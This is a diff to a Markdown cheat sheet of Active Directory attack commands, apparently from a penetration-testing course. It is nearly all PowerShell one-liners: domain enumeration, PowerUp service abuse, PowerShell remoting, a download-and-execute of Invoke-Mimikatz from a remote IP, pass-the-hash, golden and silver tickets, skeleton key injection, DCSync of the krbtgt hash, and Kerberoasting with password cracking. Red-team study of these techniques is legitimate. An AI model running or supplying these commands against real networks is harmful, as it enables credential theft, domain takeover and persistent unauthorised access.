@@ -27,7 +27,7 @@ Link: [AD Module](https://github.com/samratashok/ADModule)
 
 # Enumeration:
 
-### Users Enumeration:
+### Users Enumeration
 
 - **With PowerView**:
 ```powershell
@@ -63,7 +63,7 @@ Get-ADUser -Filter * -Properties * | select name
 # Displays when the password was set
 Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
 ```
-### Domain Admins Enumeration:
+### Domain Admins Enumeration
 
 - **With PowerView:**
 ```powershell
@@ -92,7 +92,7 @@ Get-ADDomain -Identity corporate.local
 (Get-DomainPolicy)."system access"                    
 ```
 
-### Computers Enumeration:
+### Computers Enumeration
 
 - **With PowerView:**
 ```powershell
@@ -117,7 +117,7 @@ Get-ADComputer -Filter * -Properties OperatingSystem | select name,OperatingSyst
 Get-ADComputer -Filter * | select Name                                               
 ```
 
-### Groups and Members Enumeration:
+### Groups and Members Enumeration
 
 - **With PowerView:**
 ```powershell
@@ -142,7 +142,7 @@ Get-ADGroupMember -Identity "Domain Admins" -Recursive
 Get-ADPrincipalGroupMembership -Identity user01                            
 ```
 
-### Enumeration Shares:
+### Enumeration Shares
 
 - **With PowerView:**
 ```powershell
@@ -156,7 +156,7 @@ Get-NetFileServer
 Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC –Verbose
 ```
 
-### Enumeration OUI and GPO:
+### Enumeration OUI and GPO
 
 - **With PowerView:**
 ```powershell
@@ -172,15 +172,15 @@ Get-NetGPO
 Get-NetGPO -ADSpath 'LDAP://cn={example},CN=example'                        
 ```
 - **With AD Module:**
-```
+```powershell
 # Get the organizational units in a domain
 Get-ADOrganizationalUnit -Filter * -Properties *                            
 ```
 
-### Enumeration ACL:
+### ACLs Enumeration
 
 - **With PowerView:**
-```
+```powershell
 # Enumerates the ACLs for the users group
 Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs                         
 # Enumerates the ACLs for the Domain Admins group
@@ -195,10 +195,10 @@ Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "user"}
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPusers"} 
 ```
 
-### Domain Trust mapping:
+### Domain Trust Mapping
 
 - **With PowerView:**
-```
+```powershell
 # Get the list of all trusts within the current domain
 Get-NetDomainTrust                                                          
 # Get the list of all trusts within the indicated domain
@@ -209,109 +209,127 @@ Get-NetDomainTrust -Domain us.domain.corporation.local
 ![Main Logo](images/Example_trust01.PNG 'Example01')
 
 - **With AD Module:**
-```
-Get-ADTrust -Filter *                                                       #Get the list of all trusts within the current domain
-Get-ADTrust -Identity us.domain.corporation.local                           #Get the list of all trusts within the indicated domain
+```powershell
+# Get the list of all trusts within the current domain
+Get-ADTrust -Filter *                                                       
+# Get the list of all trusts within the indicated domain
+Get-ADTrust -Identity us.domain.corporation.local                           
 ```
 
-### Domain Enumeration Forest:
+### Domain Enumeration Forest
 
 - **With PowerView:**
-```
-Get-NetForestDomain                                                                #Get all domains in the current forest
-Get-NetForestDomain -Forest corporation.local                                      #Get all domains in the current forest
-Get-NetForestDomain -Verbose | Get-NetDomainTrust                                  #Maps all trusts
-Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'} #Maps only external trusts
+```powershell
+# Get all domains in the current forest
+Get-NetForestDomain                                                                
+# Get all domains in the current forest
+Get-NetForestDomain -Forest corporation.local                                      
+# Map all trusts
+Get-NetForestDomain -Verbose | Get-NetDomainTrust                                  
+# Map only external trusts
+Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
 ```
 **Example:**
 
 ![Main Logo](images/Example_trust02.PNG 'Example02')
 
 - **With AD Module:**
-```
-(Get-ADForest).Domains                                                                                                 #Get all domains in the current forest
-(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_} #Maps only external trusts
+```powershell
+# Get all domains in the current forest
+(Get-ADForest).Domains                                                                                                 
+# Map only external trusts
+(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_} 
 ```
 
-### Domain Enumeration User Hunting:
+### Domain Enumeration User Hunting
 
 - **With PowerView:**
-```
-Find-LocalAdminAccess -Verbose                                    #Find all machines on the current domain where the current user has local admin access
-Invoke-UserHunter                                                 #Looks for machines where a domain administrator is logged on
-Invoke-UserHunter -CheckAccess                                    #Confirm access to the machine as an administrator
+```powershell
+# Find all machines on the current domain where the current user has local admin access
+Find-LocalAdminAccess -Verbose                                    
+# Looks for machines where a domain administrator is logged on
+Invoke-UserHunter                                                 
+# Confirm access to the machine as an administrator
+Invoke-UserHunter -CheckAccess                                    
 ```
 
-# Local Privilege Escalation:
+## Local Privilege Escalation:
 
-## Using PowerUp:
-```
+### Using PowerUp:
+```powershell
 . .\PowerUp.ps1
 ```
-Link: ![PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
-## BeRoot
-```
+Link: [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+### BeRoot
+```powershell
 .\beRoot.exe
 ```
-Link: ![BeRoot](https://github.com/AlessandroZ/BeRoot/tree/master/Windows)
-## PrivEsc
-```
+Link: [BeRoot](https://github.com/AlessandroZ/BeRoot/tree/master/Windows)
+### PrivEsc
+```powershell
 . .\privesc.ps1
 ```
-Link: ![PrivEsc](https://github.com/enjoiz/Privesc/blob/master/privesc.ps1)
+Link: [PrivEsc](https://github.com/enjoiz/Privesc/blob/master/privesc.ps1)
 
 - **With PowerUp:**
-```
-Invoke-AllChecks                                                         #Performs all checks
-Get-ServiceUnquoted -Verbose                                             #Get services with unquoted paths and a space in their name.
-Get-ModifiableServiceFile -Verbose                                       #Get services where the current user can write to its binary path or change arguments to the binary
-Get-ModifiableService -Verbose                                           #Get the services whose configuration current user can modify
-Invoke-ServiceAbuse -Name 'software_xxx' -UserName 'corporate\student01' #Let's add our current domain user to the local Administrators group 
+```powershell
+# Performs all checks
+Invoke-AllChecks                                                         
+# Get services with unquoted paths and a space in their name
+Get-ServiceUnquoted -Verbose                                             
+# Get services where the current user can write to its binary path or change arguments to the binary
+Get-ModifiableServiceFile -Verbose                                       
+# Get the services whose configuration current user can modify
+Get-ModifiableService -Verbose                                           
+# Let's add our current domain user to the local Administrators group 
+Invoke-ServiceAbuse -Name 'software_xxx' -UserName 'corporate\student01'
 ```
 - **With PrivEsc:**
-```
-Invoke-Privesc                                        #Performs all checks
+```powershell
+# Performs all checks
+Invoke-Privesc                                        
 ```
 
-# Lateral Movement
+## Lateral Movement
 
 - **Powershell Remoting:**
-```
-Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName xxxx.corporate.corp.local          #Execute whoami & hostname commands on the indicated server
-Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName xxxx.corporate.corp.local #Execute the script Git-PassHashes.ps1 on the indicated server
+```powershell
+# Execute whoami & hostname commands on the indicated server
+Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName xxxx.corporate.corp.local          
+# Execute the script Git-PassHashes.ps1 on the indicated server
+Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName xxxx.corporate.corp.local 
 ```
 
 - **Invoke-Mimikatz:**
+```powershell
+# Execute Invoke-Mimikatz from computer xxx.xxx.xxx.xxx
+iex (iwr http://xxx.xxx.xxx.xxx/Invoke-Mimikatz.ps1 -UseBasicParsing)                                           
+# "Over pass the hash" generate tokens from hashes
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corporate.corp.local /ntlm:x /run:powershell.exe"'
 ```
-iex (iwr http://xxx.xxx.xxx.xxx/Invoke-Mimikatz.ps1 -UseBasicParsing)                                           #Execute Invoke-Mimikatz from computer xxx.xxx.xxx.xxx
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corporate.corp.local /ntlm:x /run:powershell.exe"' #"Over pass the hash" generate tokens from hashes
-```
-# Persistence - Golden Ticket
+## Persistence
+### Golden Ticket
 
 - **Invoke-Mimikatz:**
-```
+```powershell
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'                                                                #Execute mimikatz on DC as DA to get hashes
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /krbtgt:0c88028bf3aa6a6a143ed846f2be1ea4 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'    #Golden Ticket
 ```
-
-# Persistence - Silver Ticket
-
+### Silver Ticket
 - **Invoke-Mimikatz:**
-```
+```powershell
 Invoke-Mimikatz -Command '"kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:0c88028bf3aa6a6a143ed846f2be1ea4 /user:Administrator /ptt"'    #Silver Ticket for service HOST
 ```
-
-# Persistence Skeleton Key
-
+### Skeleton Key
 - **Invoke-Mimikatz:**
-```
+```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'-ComputerName dcorp-dc.corporate.corp.local    #Command to inject a skeleton key
 ```
 
-# DCSync
+## DCSync
 
 - **With PowerView and Invoke-Mimikatz:**
-```
+```powershell
 Get-ObjectAcl -DistinguishedName "dc=corporate,dc=corp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "user01") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}  #Check if user01 has these permissions
 Add-ObjectAcl -TargetDistinguishedName "dc=corporate,dc=corp,dc=local" -PrincipalSamAccountName user01 -Rights DCSync -Verbose  #If you are a domain admin, you can grant this permissions to any user
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'  #Gets the hash of krbtgt
@@ -320,21 +338,21 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'  #Gets the hash 
 # Privilege Escalation - Kerberoast
 
 **1. Enumeration with Powerview:**
-```
+```powershell
 Get-NetUser SPN           #Find user accounts used as Service accounts with PowerView
 ```
 **2. Enumeration with AD Module:**
-```
+```powershell
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName      #Find user accounts used as Service accounts
 ```
 **3. Request a TGS:**
-```
+```powershell
 Add-Type -AssemblyNAme System.IdentityModel                                                                                    #Request a TGS - Phase 1
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.corp.corporate.local" #Request a TGS - Phase 2
 klist                                                                                                                          #Check if the TGS has been granted
 ```
 **4. Export and crack TGS:**
-```
+```powershell
 Invoke-Mimikatz -Command '"kerberos::list /export"'                                                                                        #Export all tickets
 python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\3-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.corp.corporate.local-CORP.CORPORATE.LOCAL.kirbi #Crack the Service account password
 ```
